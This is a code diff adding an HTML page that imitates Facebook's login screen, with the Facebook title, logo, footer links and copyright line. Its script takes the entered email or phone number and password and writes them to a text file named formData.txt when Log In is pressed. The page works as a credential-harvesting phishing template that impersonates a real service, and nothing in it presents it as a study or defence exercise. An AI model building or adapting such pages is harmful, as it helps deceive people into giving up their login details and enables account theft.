@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Login to Facebook</title>
+  </head>
+  <body>
+    <section class="body">
+      <div class="innerBody">
+        <div class="fb-img">
+          <img src="./fb.svg" alt="fb-logo" />
+        </div>
+        <div class="rightBox">
+          <div class="loginBox">
+            <form class="inputForm">
+              <div>
+                <div class="login">
+                  <p>Log in to Facebook</p>
+                  <input
+                    class="inputField"
+                    type="text"
+                    placeholder="Email or phone number"
+                    id="txtEmail"
+                  />
+                  <input
+                    class="inputField"
+                    type="password"
+                    placeholder="Password"
+                    id="txtPassword"
+                  />
+                  <input
+                    class="loginButton"
+                    type="button"
+                    value="Log In"
+                    id="bt"
+                    onclick="saveFile()"
+                  />
+                  <a href="#">Forgot profile?</a>
+                </div>
+                <!-- <div class="hLine"></div> -->
+                <h2 class="hline"><span>or</span></h2>
+                <div class="signUp">
+                  <a class="signup-a" role="button" href="#"
+                    >Create New Account</a
+                  >
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </section>
+    <footer>
+      <div class="footerBox">
+        <div class="languageBar">
+          <ul>
+            <li>English (UK)</li>
+            <li><a href="#">Bulgarian</a></li>
+            <li><a href="#">العربیۃ</a></li>
+            <li><a href="#">پشتو</a></li>
+            <li><a href="#">اردو</a></li>
+            <li><a href="#">हिन्दी</a></li>
+            <li><a href="#">ਪੰਜਾਬੀ</a></li>
+            <li><a href="#">বাংলা</a></li>
+            <li><a href="#">Deutsch</a></li>
+            <li><a href="#">ગુજરાતી</a></li>
+            <li><a href="#">فارسی</a></li>
+            <li><a href="#">Español</a></li>
+            <li>
+              <a
+                class="plusButton"
+                role="button"
+                href="#"
+                style="text-decoration: none; color: black"
+                >+</a
+              >
+            </li>
+          </ul>
+        </div>
+        <div class="hLine"></div>
+        <div
+          id="pageFooterChildren"
+          role="contentinfo"
+          aria-label="Facebook site links"
+        >
+          <ul>
+            <li><a href="#">Registration</a></li>
+            <li><a href="#">Sign Up</a></li>
+            <li><a href="#">Log In</a></li>
+            <li><a href="#">Messenger</a></li>
+            <li><a href="#">Facebook Lite</a></li>
+            <li><a href="#">Watch </a></li>
+            <li><a href="#">People</a></li>
+            <li><a href="#">Pages</a></li>
+            <li><a href="#">Page categories</a></li>
+            <li><a href="#">Places</a></li>
+            <li><a href="#">Games</a></li>
+            <li><a href="#">Locations</a></li>
+            <li><a href="#">Market</a></li>
+            <li><a href="#">Facebook Pay</a></li>
+            <li><a href="#">Groups</a></li>
+            <li><a href="#">Oculus</a></li>
+            <li><a href="#">Work</a></li>
+            <li><a href="#">Voting information center</a></li>
+            <li><a href="#">Portal</a></li>
+            <li><a href="#">Instagram</a></li>
+            <li><a href="#">Local</a></li>
+            <li><a href="#">Fundraisers</a></li>
+            <li><a href="#">Services</a></li>
+            <li><a href="#">Create an ad</a></li>
+            <li><a href="#">Create a Page</a></li>
+            <li><a href="#">Developers</a></li>
+            <li><a href="#">Careers</a></li>
+            <li><a href="#">Confidentiality</a></li>
+            <li><a href="#">Cookies</a></li>
+            <li><a href="#">Your choice</a></li>
+            <li><a href="#">Condition</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Help</a></li>
+          </ul>
+        </div>
+        <div class="copyRight">
+          <span>Facebook © 2021</span>
+        </div>
+      </div>
+    </footer>
+  </body>
+  <script>
+    let saveFile = () => {
+      const userName = document.getElementById('txtEmail');
+      const password = document.getElementById('txtPassword');
+
+      let data =
+        '\r PhoneNumber/Email: ' +
+        userName.value +
+        ' \r\n ' +
+        'Password: ' +
+        password.value;
+
+      const textToBLOB = new Blob([data], { type: 'text/plain' });
+      const sFileName = 'formData.txt';
+
+      let newLink = document.createElement('a');
+      newLink.download = sFileName;
+
+      if (window.webkitURL != null) {
+        newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+      } else {
+        newLink.href = window.URL.createObjectURL(textToBLOB);
+        newLink.style.display = 'none';
+        document.body.appendChild(newLink);
+      }
+
+      newLink.click();
+    };
+  </script>
+</html>
